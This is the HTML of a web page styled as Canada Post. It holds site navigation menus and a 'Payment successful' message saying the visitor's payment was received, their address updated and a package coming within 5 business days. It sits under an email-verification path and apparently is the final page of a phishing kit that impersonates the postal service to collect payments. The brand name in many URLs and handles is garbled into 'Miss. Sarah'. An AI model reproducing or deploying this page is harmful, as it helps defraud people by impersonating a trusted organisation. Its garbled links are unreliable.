        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/our-company/giving-back-to-our-communities/kids-postal-service-activities.page?" class="menu-title " target="" alt="">Kids postal service activities</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/our-company/giving-back-to-our-communities/kids-postal-service-activities.page?" target="" alt="">
          <h3 class="submenu-header">Kids postal service activities<span class="open-new-window"></span></h3>
          <p>Download printable mail templates and activity sheets.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
              </ul>
            </div>
          </li>
    
          <li>
            <a href="//cpc/en/our-company/jobs.page?" class="parent-link" target="" alt="">Jobs</a>
            <div class="menu-item-level level1" data-level="2">
              <div class="menu-overview">
              <a class="parent-title" href="//cpc/en/our-company/jobs.page?" target="" alt="">
              <h3 class="submenu-header">Jobs<span class="open-new-window"></span></h3>
                <p>View available job opportunities.</p>
              </a>
              </div> 
              <ul>
                
          <li>
            <a href="https://jobs.Miss. Sarah.ca/go/Canada-Post-All-Current-Opportunities/2319117/" class="menu-title " target="_blank" alt="Opens in new tab">Apply for current opportunities</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="https://jobs.Miss. Sarah.ca/go/Canada-Post-All-Current-Opportunities/2319117/" target="_blank" alt="Opens in new tab">
          <h3 class="submenu-header">Apply for current opportunities<span class="open-new-window"></span></h3>
          <p>Browse available jobs at Canada Post.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
              </ul>
            </div>
          </li>
    
          <li>
            <a href="//cpc/en/our-company/business-opportunities.page?" class="parent-link" target="" alt="">Business opportunities</a>
            <div class="menu-item-level level1" data-level="2">
              <div class="menu-overview">
              <a class="parent-title" href="//cpc/en/our-company/business-opportunities.page?" target="" alt="">
              <h3 class="submenu-header">Business opportunities<span class="open-new-window"></span></h3>
                <p>Learn about bids for contract work and retail partnerships.</p>
              </a>
              </div> 
              <ul>
                
          <li>
            <a href="//cpc/en/our-company/business-opportunities/contracts-for-your-business.page?" class="menu-title parent-link" target="" alt="">Contract work for your business</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/our-company/business-opportunities/contracts-for-your-business.page?" target="" alt="">
          <h3 class="submenu-header">Contract work for your business<span class="open-new-window"></span></h3>
          <p>Partner with us and bid on contracts for your business.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="//cpc/en/our-company/business-opportunities/contracts-for-your-business/goods-and-services-contracts.page?" class="" target="" alt="">Goods and services contracts</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/our-company/business-opportunities/contracts-for-your-business/goods-and-services-contracts.page?" target="" alt="">
        <h3 class="submenu-header">Goods and services contracts<span class="open-new-window"></span></h3>
        <p>Browse and bid on goods and services contracts.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/our-company/business-opportunities/contracts-for-your-business/transportation-contracts.page?" class="" target="" alt="">Transportation contracts</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/our-company/business-opportunities/contracts-for-your-business/transportation-contracts.page?" target="" alt="">
        <h3 class="submenu-header">Transportation contracts<span class="open-new-window"></span></h3>
        <p>Bid on air and ground transportation contracts.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/our-company/business-opportunities/become-an-authorized-retailer.page?" class="menu-title " target="" alt="">Become an authorized retail partner</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/our-company/business-opportunities/become-an-authorized-retailer.page?" target="" alt="">
          <h3 class="submenu-header">Become an authorized retail partner<span class="open-new-window"></span></h3>
          <p>Offer post office products and services from your business.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
              </ul>
            </div>
          </li>
    
          <li>
            <a href="//cpc/en/our-company/news-and-media.page?" class="parent-link" target="" alt="">News and media</a>
            <div class="menu-item-level level1" data-level="2">
              <div class="menu-overview">
              <a class="parent-title" href="//cpc/en/our-company/news-and-media.page?" target="" alt="">
              <h3 class="submenu-header">News and media<span class="open-new-window"></span></h3>
                <p>Access mailing service updates and images for media.</p>
              </a>
              </div> 
              <ul>
                
          <li>
            <a href="//cpc/en/our-company/news-and-media/service-alerts.page?" class="menu-title parent-link" target="" alt="">Service alerts</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/our-company/news-and-media/service-alerts.page?" target="" alt="">
          <h3 class="submenu-header">Service alerts<span class="open-new-window"></span></h3>
          <p>Updated details on mail delivery interruptions.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="//cpc/en/our-company/news-and-media/service-alerts/service-alerts-archive.page?" class="" target="" alt="">Service alerts archive </a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/our-company/news-and-media/service-alerts/service-alerts-archive.page?" target="" alt="">
        <h3 class="submenu-header">Service alerts archive <span class="open-new-window"></span></h3>
        <p>Browse past service alerts.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/our-company/news-and-media/corporate-news.page?" class="menu-title parent-link" target="" alt="">Corporate news</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/our-company/news-and-media/corporate-news.page?" target="" alt="">
          <h3 class="submenu-header">Corporate news<span class="open-new-window"></span></h3>
          <p>Access news releases and company updates.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="//cpc/en/our-company/news-and-media/corporate-news/news-release-list.page?" class="" target="" alt="">News releases</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/our-company/news-and-media/corporate-news/news-release-list.page?" target="" alt="">
        <h3 class="submenu-header">News releases<span class="open-new-window"></span></h3>
        <p>Browse our most recent and past news releases.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/our-company/news-and-media/corporate-news/closures-and-service-interruptions-list.page?" class="" target="" alt="">Closures and service interruptions</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/our-company/news-and-media/corporate-news/closures-and-service-interruptions-list.page?" target="" alt="">
        <h3 class="submenu-header">Closures and service interruptions<span class="open-new-window"></span></h3>
        <p>Learn about weather events and holiday hours impacting delivery.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/our-company/news-and-media/corporate-news/negotiations-list.page?" class="" target="" alt="">Negotiations updates</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/our-company/news-and-media/corporate-news/negotiations-list.page?" target="" alt="">
        <h3 class="submenu-header">Negotiations updates<span class="open-new-window"></span></h3>
        <p>Get information on negotiations with our unions.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/our-company/news-and-media/corporate-news/coronavirus-disease-covid-19.page?" class="parent-link" target="" alt="">COVID-19 updates</a>
      <div class="menu-item-level level4" data-level="4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/our-company/news-and-media/corporate-news/coronavirus-disease-covid-19.page?" target="" alt="">
        <h3 class="submenu-header">COVID-19 updates<span class="open-new-window"></span></h3>
        <p>Learn about impacts to sending amid COVID-19.</p>
        </a>
        </div> 
        <ul>
          
          <li>
          <a href="//cpc/en/our-company/news-and-media/corporate-news/coronavirus-disease-covid-19/coronavirus-disease-covid-19-faq.page?" class="" target="" alt="">COVID-19 frequently asked questions </a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/our-company/news-and-media/corporate-news/coronavirus-disease-covid-19/coronavirus-disease-covid-19-faq.page?" target="" alt="">
            <h3 class="submenu-header">COVID-19 frequently asked questions <span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/our-company/news-and-media/media-centre.page?" class="menu-title parent-link" target="" alt="">Media centre</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/our-company/news-and-media/media-centre.page?" target="" alt="">
          <h3 class="submenu-header">Media centre<span class="open-new-window"></span></h3>
          <p>Access official company images, logos and videos.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="//cpc/en/our-company/news-and-media/media-centre/photo-gallery.page?" class="" target="" alt="">Photo gallery</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/our-company/news-and-media/media-centre/photo-gallery.page?" target="" alt="">
        <h3 class="submenu-header">Photo gallery<span class="open-new-window"></span></h3>
        <p>Browse and download official company images.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/our-company/news-and-media/media-centre/b-roll-footage.page?" class="" target="" alt="">B-roll footage</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/our-company/news-and-media/media-centre/b-roll-footage.page?" target="" alt="">
        <h3 class="submenu-header">B-roll footage<span class="open-new-window"></span></h3>
        <p>View and download B-roll footage of our facilities and products.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/our-company/news-and-media/media-centre/canada-post-logos.page?" class="" target="" alt="">Canada Post logos</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/our-company/news-and-media/media-centre/canada-post-logos.page?" target="" alt="">
        <h3 class="submenu-header">Canada Post logos<span class="open-new-window"></span></h3>
        <p>Access our company logo and guidelines on how it should be applied.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
              </ul>
            </div>
          </li>
    
       
        </ul>
        <ul id="mobile-nav-section-shop" class="menu-primary-links" data-sitemap="shop">
         
      <div class="menu-overview">
      <a class="parent-title" href="https://store.Miss. Sarah-postescanada.ca/store-boutique/en/home" target="">
      <h3 class="submenu-header">Store<span class="open-new-window"></span></h3>
      <p>Shop for stamps, shipping supplies and collectibles.</p>
      </a>
      </div> 
      
          <li>
            <a href="https://store.Miss. Sarah-postescanada.ca/store-boutique/en/1/c/mailing-and-shipping" class="parent-link" target="" alt="">Mailing and shipping</a>
            <div class="menu-item-level level1" data-level="2">
              <div class="menu-overview">
              <a class="parent-title" href="https://store.Miss. Sarah-postescanada.ca/store-boutique/en/1/c/mailing-and-shipping" target="" alt="">
              <h3 class="submenu-header">Mailing and shipping<span class="open-new-window"></span></h3>
                <p>Order packaging, envelopes, stamps, boxes and wraps.</p>
              </a>
              </div> 
              <ul>
                
          <li>
            <a href="https://store.Miss. Sarah-postescanada.ca/store-boutique/en/5/c/postage-stamps" class="menu-title " target="" alt="">Postage stamps</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="https://store.Miss. Sarah-postescanada.ca/store-boutique/en/5/c/postage-stamps" target="" alt="">
          <h3 class="submenu-header">Postage stamps<span class="open-new-window"></span></h3>
          <p></p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://store.Miss. Sarah-postescanada.ca/store-boutique/en/8/c/flat-rate-prepaid-products" class="menu-title parent-link" target="" alt="">Flat rate (prepaid) products</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="https://store.Miss. Sarah-postescanada.ca/store-boutique/en/8/c/flat-rate-prepaid-products" target="" alt="">
          <h3 class="submenu-header">Flat rate (prepaid) products<span class="open-new-window"></span></h3>
          <p>Discover prepaid envelopes and flat rate boxes, priced by region.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="https://store.Miss. Sarah-postescanada.ca/store-boutique/en/38/c/flat-rate-prepaid-products-and-shipping-regions" class="" target="" alt="">Flat rate (prepaid) products and shipping regions</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://store.Miss. Sarah-postescanada.ca/store-boutique/en/38/c/flat-rate-prepaid-products-and-shipping-regions" target="" alt="">
        <h3 class="submenu-header">Flat rate (prepaid) products and shipping regions<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://store.Miss. Sarah-postescanada.ca/store-boutique/en/7/c/shipping-supplies" class="menu-title " target="" alt="">Shipping supplies</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="https://store.Miss. Sarah-postescanada.ca/store-boutique/en/7/c/shipping-supplies" target="" alt="">
          <h3 class="submenu-header">Shipping supplies<span class="open-new-window"></span></h3>
          <p></p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
              </ul>
            </div>
          </li>
    
          <li>
            <a href="https://store.Miss. Sarah-postescanada.ca/store-boutique/en/2/c/stamp-collecting" class="parent-link" target="" alt="">Stamp collecting</a>
            <div class="menu-item-level level1" data-level="2">
              <div class="menu-overview">
              <a class="parent-title" href="https://store.Miss. Sarah-postescanada.ca/store-boutique/en/2/c/stamp-collecting" target="" alt="">
              <h3 class="submenu-header">Stamp collecting<span class="open-new-window"></span></h3>
                <p>See the latest stamp collections and quality accessories.</p>
              </a>
              </div> 
              <ul>
                
          <li>
            <a href="https://store.Miss. Sarah-postescanada.ca/store-boutique/en/10/c/stamps-and-collectibles" class="menu-title " target="" alt="">Stamps and collectibles</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="https://store.Miss. Sarah-postescanada.ca/store-boutique/en/10/c/stamps-and-collectibles" target="" alt="">
          <h3 class="submenu-header">Stamps and collectibles<span class="open-new-window"></span></h3>
          <p></p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://store.Miss. Sarah-postescanada.ca/store-boutique/en/13/c/stamp-collecting-accessories" class="menu-title " target="" alt="">Stamp collecting accessories</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="https://store.Miss. Sarah-postescanada.ca/store-boutique/en/13/c/stamp-collecting-accessories" target="" alt="">
          <h3 class="submenu-header">Stamp collecting accessories<span class="open-new-window"></span></h3>
          <p></p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://store.Miss. Sarah-postescanada.ca/store-boutique/en/14/c/postcards" class="menu-title " target="" alt="">Postcards</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="https://store.Miss. Sarah-postescanada.ca/store-boutique/en/14/c/postcards" target="" alt="">
          <h3 class="submenu-header">Postcards<span class="open-new-window"></span></h3>
          <p></p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
              </ul>
            </div>
          </li>
    
          <li>
            <a href="https://store.Miss. Sarah-postescanada.ca/store-boutique/en/3/c/coin-collecting" class="parent-link" target="" alt="">Coin collecting</a>
            <div class="menu-item-level level1" data-level="2">
              <div class="menu-overview">
              <a class="parent-title" href="https://store.Miss. Sarah-postescanada.ca/store-boutique/en/3/c/coin-collecting" target="" alt="">
              <h3 class="submenu-header">Coin collecting<span class="open-new-window"></span></h3>
                <p>View featured collectible coins released by the Canadian Mint.</p>
              </a>
              </div> 
              <ul>
                
          <li>
            <a href="https://store.Miss. Sarah-postescanada.ca/store-boutique/en/15/c/new-arrivals" class="menu-title " target="" alt="">New arrivals</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="https://store.Miss. Sarah-postescanada.ca/store-boutique/en/15/c/new-arrivals" target="" alt="">
          <h3 class="submenu-header">New arrivals<span class="open-new-window"></span></h3>
          <p></p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://store.Miss. Sarah-postescanada.ca/store-boutique/en/16/c/coins-and-collectables" class="menu-title " target="" alt="">Coins and coin sets</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="https://store.Miss. Sarah-postescanada.ca/store-boutique/en/16/c/coins-and-collectables" target="" alt="">
          <h3 class="submenu-header">Coins and coin sets<span class="open-new-window"></span></h3>
          <p></p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://store.Miss. Sarah-postescanada.ca/store-boutique/en/17/c/coin-collecting-accessories" class="menu-title " target="" alt="">Coin albums and accessories</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="https://store.Miss. Sarah-postescanada.ca/store-boutique/en/17/c/coin-collecting-accessories" target="" alt="">
          <h3 class="submenu-header">Coin albums and accessories<span class="open-new-window"></span></h3>
          <p></p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
              </ul>
            </div>
          </li>
    
          <li>
            <a href="https://store.Miss. Sarah-postescanada.ca/quick-order" class="" target="" alt="">Quick Order</a>
            <div class="menu-hide level1">
              <div class="menu-overview">
              <a class="parent-title" href="https://store.Miss. Sarah-postescanada.ca/quick-order" target="" alt="">
              <h3 class="submenu-header">Quick Order<span class="open-new-window"></span></h3>
                <p></p>
              </a>
              </div> 
              <ul>
                
              </ul>
            </div>
          </li>
    
          <li>
            <a href="https://store.Miss. Sarah-postescanada.ca/favourites" class="" target="" alt="">Favourites</a>
            <div class="menu-hide level1">
              <div class="menu-overview">
              <a class="parent-title" href="https://store.Miss. Sarah-postescanada.ca/favourites" target="" alt="">
              <h3 class="submenu-header">Favourites<span class="open-new-window"></span></h3>
                <p></p>
              </a>
              </div> 
              <ul>
                
              </ul>
            </div>
          </li>
    
       
        </ul>

        <ul class="menu-utility-links ">
           

  <li class="search-modal-quick-link">
    <a href="//track-reperage/en" class="search-modal-link">
    <span class="search-icon track"></span>
    <span class="search-modal-label">Track</span>
    </a>
    </li>
    <li class="search-modal-quick-link">
      <a href="//info/mc/personal/postalcode/fpc.jsf" class="search-modal-link">
        <span class="search-icon look-up-postal-code"></span>
        <span class="search-modal-label">Find a postal code</span>
      </a>
    </li>
    <li class="search-modal-quick-link">
      <a href="//information/app/far/business/findARate" class="search-modal-link">
        <span class="search-icon find-rate"></span>
        <span class="search-modal-label">Find a rate</span>
      </a>
    </li>
    <li class="search-modal-quick-link">
      <a href="//cpc/en/personal/receiving/manage-mail/epost.page" class="search-modal-link">
        <span class="search-icon epost"></span>
        <span class="search-modal-label">epost</span>
      </a>
    </li>
    <li class="search-modal-quick-link">
    <a href="//cpc/en/tools.page" class="see-more-tools">See more tools</a>
    </li>
    
       </ul>

       <ul class="menu-lang-toggle ">
          <li class="language-toggle-mobile">
            <a href="//pfe-pap/en/registration/email-verification?id=432be7f1e8dc425dbde71cc59877fb46&amp;targetUrl=https:%2F%2Fwww.Miss. Sarah-postescanada.ca%2Fshop-login#">Français</a>
          </li>
        </ul>

        
       <ul class="menu-cl-ctas hide">
       
      </ul>
        <ul class="menu-cl-utility hide">
        <li class="language-toggle-mobile"><a href="//pfe-pap/en/registration/email-verification?id=432be7f1e8dc425dbde71cc59877fb46&amp;targetUrl=https:%2F%2Fwww.Miss. Sarah-postescanada.ca%2Fshop-login#" lang="fr">Français</a></li> 
        </ul>
       
      </div>
    </nav>
  </div>
    
    </div>
    <div class="mobile-active-menu-background"></div></div>
  </cpc-header><span id="main-content" tabindex="-1"></span>
   </div>
   <div class="page-body"><cpc-app-root ng-version="9.1.0"><section role="main" class="main"><div class="g-container"><router-outlet></router-outlet><cpc-email-verification-page _nghost-rlu-c40=""><section _ngcontent-rlu-c40="" role="main" class="main"><div _ngcontent-rlu-c40="" class="g-row g-container animate-enter"><div _ngcontent-rlu-c40="" class="g-col"><div _ngcontent-rlu-c40="" class="card"><div _ngcontent-rlu-c40="" class="card__main"><!----><div _ngcontent-rlu-c40="" class="animate-enter"><svg class="icon" style="vertical-align: middle;width: 150px;height: 150px;" viewBox="0 0 1027 1024" version="1.1" xmlns=""><path d="M1027.564 400.709c0 163.316-132.385 295.711-295.7 295.711-163.363 0-295.746-132.395-295.746-295.711 0-163.328 132.382-295.734 295.746-295.734 163.316 0 295.7 132.406 295.7 295.734z" fill="#E9EAEB"></path><path d="M209.494 358.032h512.043v451.817H209.494z" fill="#FFFFFF"></path><path d="M733.447 821.756H197.586V346.123h535.861v475.633zM221.402 797.94H709.63v-428H221.402v428z" fill="#2D4978"></path><path d="M993.421 720.538c0-105.183-39.678-103.205-39.678-103.205-21.863-87.322-87.308-115.116-87.308-115.116H721.537v307.631h271.884c39.724-37.7 0-89.31 0-89.31z m-198.437-77.401V561.758h65.494l37.725 81.379H794.984z" fill="#9EC7EB"></path><path d="M993.421 821.756H721.537c-6.582 0-11.907-5.326-11.907-11.907V502.217c0-6.581 5.325-11.907 11.907-11.907h144.898c1.604 0 3.184 0.324 4.648 0.941 2.816 1.198 67.611 29.619 92.288 116.034 15.653 5.547 41.167 27.153 41.934 109.358 15.468 22.327 32.002 67.97-3.697 101.834a11.814 11.814 0 0 1-8.187 3.279zM733.447 797.94h254.929c25.978-29.467-3.119-68.46-4.421-70.169-1.558-2.069-2.441-4.628-2.441-7.233 0-73.191-20.096-90.729-27.839-91.31-5.489 0.617-10.095-3.488-11.489-9.001-18.166-72.622-67.54-100.717-78.402-106.102H733.447V797.94z m164.756-142.894H794.984c-6.581 0-11.906-5.328-11.906-11.909v-81.379c0-6.582 5.325-11.908 11.906-11.908h65.494a11.95 11.95 0 0 1 10.816 6.896l37.724 81.379c1.697 3.687 1.419 8.001-0.767 11.42a11.942 11.942 0 0 1-10.048 5.501z m-91.308-23.817h72.656l-26.676-57.563h-45.98v57.563z" fill="#2D4978"></path><path d="M901.6 809.849c0 35.863-29.072 64.936-64.935 64.936-35.866 0-64.938-29.072-64.938-64.936 0-35.864 29.071-64.936 64.938-64.936 35.862 0 64.935 29.071 64.935 64.936z" fill="#E9EAEB"></path><path d="M836.665 886.692c-42.376 0-76.845-34.468-76.845-76.844 0-42.375 34.469-76.844 76.845-76.844s76.842 34.469 76.842 76.844c0 42.377-34.466 76.844-76.842 76.844z m0-129.871c-29.235 0-53.028 23.792-53.028 53.027 0 29.234 23.793 53.028 53.028 53.028 29.232 0 53.027-23.794 53.027-53.028 0-29.235-23.795-53.027-53.027-53.027z" fill="#2D4978"></path><path d="M348.437 809.849m-64.936 0a64.936 64.936 0 1 0 129.872 0 64.936 64.936 0 1 0-129.872 0Z" fill="#E9EAEB"></path><path d="M348.437 886.692c-42.375 0-76.844-34.468-76.844-76.844 0-42.375 34.469-76.844 76.844-76.844 42.376 0 76.843 34.469 76.843 76.844 0 42.377-34.467 76.844-76.843 76.844z m0-129.871c-29.235 0-53.028 23.792-53.028 53.027 0 29.234 23.792 53.028 53.028 53.028 29.234 0 53.028-23.794 53.028-53.028-0.001-29.235-23.794-53.027-53.028-53.027zM13.396 338.983h26.793v26.793H13.396zM74.413 338.983h26.793v26.793H74.413zM74.413 466.994h26.793v26.792H74.413zM136.93 466.994h403.383v26.792H136.93zM0 597.982h26.793v26.792H0zM62.506 597.982h305.142v26.792H62.506z" fill="#2D4978"></path><path d="M610.272 194.599H454.724l-2.651-8.304c-3.303-10.408-8.349-17.233-14.955-20.28-9.559-4.407-20.537-0.173-20.653-0.127l-13.443 5.663-2.861-14.315c-0.349-1.559-9.326-40.353-61.541-40.353-52.702 0-67.377 65.494-67.982 68.286l-2.023 9.408-156.479 0.023v-23.817h137.64c9.489-31.223 36.747-77.715 88.844-77.715 47.889 0 71.891 26.747 81.054 47.621 7.512-1 17.42-0.919 27.421 3.698 10.721 4.941 18.955 13.804 24.536 26.396h138.64v23.816zM1003.33 272.314h-60.285l-2.652-8.291c-3.279-10.338-8.277-17.142-14.815-20.223-9.768-4.604-20.837-0.221-20.93-0.163l-13.329 5.338-2.884-14.037c-0.349-1.558-9.279-40.34-61.491-40.34-52.703 0-67.38 65.494-67.982 68.284l-2.024 9.408-156.479 0.023v-23.815h137.639c9.489-31.223 36.749-77.716 88.847-77.716 47.888 0 71.865 26.748 81.006 47.622 7.489-1 17.442-0.919 27.445 3.697 10.72 4.943 18.954 13.804 24.559 26.398h43.377v23.815z" fill="#B6B9BE"></path></svg><h1 _ngcontent-rlu-c40="" tabindex="0" class="heading">Payment successful</h1><p _ngcontent-rlu-c40="">Thank you, your payment has been received and your address successfully updated. You should receive your package in the next 5 business days.</p><!----><!----><a _ngcontent-rlu-c40="" class="button button--primary by-keyboard xs-only-full" href="//lfe-cap/en/login?targetUrl=https%3A%2F%2Fwww.Miss. Sarah-postescanada.ca%2Fshop-login">Sign in</a><a _ngcontent-rlu-c40="" class="button button--secondary by-keyboard xs-only-full" href="//cpc/en/home.page">Go to homepage</a><!----></div><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----></div></div></div></div></section></cpc-email-verification-page><!----></div></section></cpc-app-root>
   </div>
   <div class="page-footer"><cpc-footer class="cpc-component"><div id="cpc-main-footer" class="cpc-footer-container"><div class="cpc-footer">
<div class="noindex">
<section class="footer-l1" role="navigation" aria-label="Footer navigation"> 
  <div class="row show-for-large-up">
    <div class="large-3 columns">
    
    <h2 class="show-for-medium-up">Connect with us</h2>
    <ul class="social-media-icons">
      
    <li><a href="https://www.facebook.com/Miss. Sarah" target="_blank">
<svg width="24" height="24" xmlns="http://www.w3.org/2000/svg"><title>Facebook</title><path d="M12.688 22h-9.63A1.058 1.058 0 0 1 2 20.942V3.058C2 2.474 2.474 2 3.058 2h17.884C21.526 2 22 2.474 22 3.058v17.884c0 .584-.474 1.058-1.058 1.058H15.82v-7.731h2.614l.391-3.036H15.82V9.308c0-.878.243-1.48 1.503-1.48h1.608v-2.75a21.493 21.493 0 0 0-2.338-.117 3.662 3.662 0 0 0-3.905 4.03v2.232h-2.614v3.035h2.624L12.688 22z" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path></svg>
</a></li>
    
    <li><a href="https://twitter.com/Miss. Sarahcorp" target="_blank">
<svg width="24" height="24" xmlns="http://www.w3.org/2000/svg"><title>Twitter</title><path d="M9.681 17.08c4.717 0 7.297-3.909 7.297-7.297 0-.111-.002-.222-.007-.332.5-.362.936-.814 1.279-1.328a5.12 5.12 0 0 1-1.473.404c.53-.317.936-.82 1.128-1.419a5.138 5.138 0 0 1-1.629.623 2.565 2.565 0 0 0-4.37 2.339A7.28 7.28 0 0 1 6.62 7.39a2.563 2.563 0 0 0 .794 3.424 2.545 2.545 0 0 1-1.162-.32v.032c0 1.242.884 2.279 2.057 2.514a2.572 2.572 0 0 1-1.158.044 2.567 2.567 0 0 0 2.396 1.781 5.146 5.146 0 0 1-3.797 1.063 7.26 7.26 0 0 0 3.931 1.151M19.5 22h-15A2.5 2.5 0 0 1 2 19.5v-15A2.5 2.5 0 0 1 4.5 2h15A2.5 2.5 0 0 1 22 4.5v15a2.5 2.5 0 0 1-2.5 2.5" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path></svg>
</a></li>
    
    <li><a href="https://www.instagram.com/Miss. Sarahagram/?hl=en" target="_blank">
<svg width="24" height="24" xmlns="http://www.w3.org/2000/svg"><title>Instagram</title><path d="M18.54 6.658a1.199 1.199 0 1 1-2.397 0 1.199 1.199 0 0 1 2.397 0zm-6.53 8.665a3.333 3.333 0 1 0 0-6.667 3.333 3.333 0 0 0 0 6.667zm0-8.412a5.131 5.131 0 1 1-5.13 5.131 5.131 5.131 0 0 1 5.13-5.184v.053zm0-3.06c-2.67 0-2.986 0-4.037.063a5.531 5.531 0 0 0-1.851.347 3.312 3.312 0 0 0-1.893 1.893 5.531 5.531 0 0 0-.347 1.85c0 1.052-.063 1.367-.063 4.038 0 2.67 0 2.986.063 4.038.01.632.127 1.258.347 1.85a3.312 3.312 0 0 0 1.893 1.893c.593.22 1.218.338 1.85.347 1.052 0 1.368.063 4.039.063 2.67 0 2.986 0 4.037-.063a5.531 5.531 0 0 0 1.851-.347 3.312 3.312 0 0 0 1.893-1.892c.22-.593.338-1.219.347-1.851 0-1.052.063-1.367.063-4.038 0-2.67 0-2.986-.063-4.038a5.531 5.531 0 0 0-.347-1.85 3.312 3.312 0 0 0-1.893-1.893 5.531 5.531 0 0 0-1.85-.347c-1.063-.105-1.378-.105-4.038-.105v.042zm0-1.798c2.713 0 3.05 0 4.122.063a7.36 7.36 0 0 1 2.43.462 5.11 5.11 0 0 1 2.912 2.871c.29.778.447 1.6.463 2.429 0 1.052.063 1.41.063 4.122 0 2.713 0 3.05-.063 4.122a7.36 7.36 0 0 1-.463 2.429 5.11 5.11 0 0 1-2.923 2.923 7.36 7.36 0 0 1-2.429.463c-1.052 0-1.41.063-4.122.063-2.713 0-3.05 0-4.122-.063a7.36 7.36 0 0 1-2.429-.463 5.11 5.11 0 0 1-2.923-2.923 7.36 7.36 0 0 1-.463-2.429C2.063 15.07 2 14.712 2 12c0-2.713 0-3.05.063-4.122a7.36 7.36 0 0 1 .463-2.429A5.11 5.11 0 0 1 5.46 2.526a7.36 7.36 0 0 1 2.429-.463C8.95 2.011 9.298 2 12.01 2v.053z" class="svg-shape" fill="#CBCBCB" 